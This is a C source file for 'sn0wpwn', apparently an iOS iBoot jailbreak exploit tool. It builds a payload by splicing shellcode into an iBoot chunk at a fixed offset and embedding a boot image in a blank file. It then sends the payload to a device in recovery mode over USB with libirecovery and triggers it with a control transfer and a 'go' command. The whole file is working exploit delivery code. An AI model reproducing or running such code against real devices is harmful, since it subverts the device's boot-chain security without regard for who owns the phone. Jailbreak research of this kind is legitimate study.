

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <libirecovery.h>



bool fail = false;


void *iboot_chunk;
size_t iboot_chunk_len;

void *shellcode;
size_t shellcode_len;

void *boot_image;
size_t boot_image_len;


void *blank_file;
size_t blank_file_len;

unsigned long long ecid;
irecv_client_t client = NULL;


int craft_exploit_payload(char *image) {
    
    printf("[*] Preparing iBoot chunk\n");
    
    FILE *fp = fopen("bin/iBoot_chunk", "rb");
    if (!fp) {
        printf("[-] Failed to open iBoot chunk\n");
        fail = true;
        return -1;
    }
    
    
    fseek(fp, 0, SEEK_END);
    iboot_chunk_len = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    
    iboot_chunk = (void*)malloc(iboot_chunk_len);
    
    fread(iboot_chunk, 1, iboot_chunk_len, fp);
    fclose(fp);
    
 
    
    
    printf("[*] Copying shellcode\n");
    
    fp = fopen("bin/shellcode.bin", "rb");
    if (!fp) {
        printf("[-] Failed to open shellcode\n");
        fail = true;
        return -1;
    }
    
    
    fseek(fp, 0, SEEK_END);
    shellcode_len = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    
    shellcode = (void*)malloc(shellcode_len);
    
    fread(shellcode, 1, shellcode_len, fp);
    fclose(fp);
    
    
    iboot_chunk = iboot_chunk + 0x103C;
    
    memcpy(iboot_chunk, shellcode, shellcode_len);
    
    iboot_chunk = iboot_chunk - 0x103C;
    
    free(shellcode);
    
    printf("[*] Opening boot image\n");
    
    fp = fopen(image, "rb");
    if (!fp) {
        printf("[-] Failed to open boot image\n");
        fail = true;
        return -1;
    }
    
    
    fseek(fp, 0, SEEK_END);
    boot_image_len = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    
    boot_image = (void*)malloc(boot_image_len);
    
    fread(boot_image, 1, boot_image_len, fp);
    fclose(fp);
    
    
    printf("[*] Crafting exploit payload\n");
    
    fp = fopen("bin/blank", "rb");
    if (!fp) {
        printf("[-] Failed to open blank file\n");
        fail = true;
        return -1;
    }
    
    
    fseek(fp, 0, SEEK_END);
    blank_file_len = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    
    blank_file = (void*)malloc(blank_file_len);
    
    fread(blank_file, 1, blank_file_len, fp);
    fclose(fp);
    
    blank_file = blank_file + 0x2750;
    
    memcpy(blank_file, boot_image, boot_image_len);
    
    blank_file = blank_file - 0x2750;
    
    memcpy(blank_file, iboot_chunk, iboot_chunk_len);
    
    free(iboot_chunk);
    
    free(boot_image);
    
    fp = fopen("bin/payload", "wb+");
    fwrite(blank_file, 1, blank_file_len, fp);
    fflush(fp);
    fclose(fp);
    
    
    
    
    
    return 0;
}

int main(int argc, const char * argv[]) {
    
    if (argc < 2) {
        printf("Usage: sn0wpwn boot_image\n");
        return -1;
    }
    
    char *image = argv[1];
    
    craft_exploit_payload(image);
    
    if (fail == true) {
        system("rm bin/payload");
        return -1;
    }
    
    irecv_error_t err = irecv_open_with_ecid(&client, ecid);
    
    if (err) {
        printf("[-] Could not connect to device\n");
        return -1;
    }
    
    printf("[*] Sending exploit payload\n");
    
    irecv_send_file(client, "bin/payload", 1);
    
    system("rm bin/payload");
    
    printf("[*] Exploiting\n");
    
    irecv_usb_control_transfer(client, 0x21, 2, 0, 0, 0, 0, 1000);
    
    irecv_send_command(client, "go");
    
    printf("[+] Done\n");
    
    return 0;
}
